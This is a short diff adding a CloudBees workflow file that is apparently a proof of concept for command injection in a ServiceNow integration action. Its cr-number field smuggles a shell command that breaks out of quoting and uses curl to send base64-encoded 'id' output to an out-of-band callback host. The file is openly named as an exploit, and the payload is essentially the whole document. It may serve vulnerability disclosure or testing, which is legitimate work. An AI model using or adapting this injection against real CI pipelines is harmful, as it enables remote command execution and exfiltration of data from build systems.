@@ -1,0 +1,16 @@
+apiVersion: automation.cloudbees.io/v1alpha1
+kind: workflow
+name: servicenow-injection-poc
+on:
+  push:
+    branches: [ main ]
+jobs:
+  exploit:
+    steps:
+      - uses: cloudbees-io/servicenow@v1
+        with:
+          action-type: 'create_change'
+          url: 'https://example.service-now.com'
+          username: 'testuser'
+          password: 'testpass'
+          cr-number: "12345'; curl https://d91e8tkjor33v26kiiogi3en496h6ijik.oast.me/?id=$(id | base64 -w0); echo 'DONE'; :'"
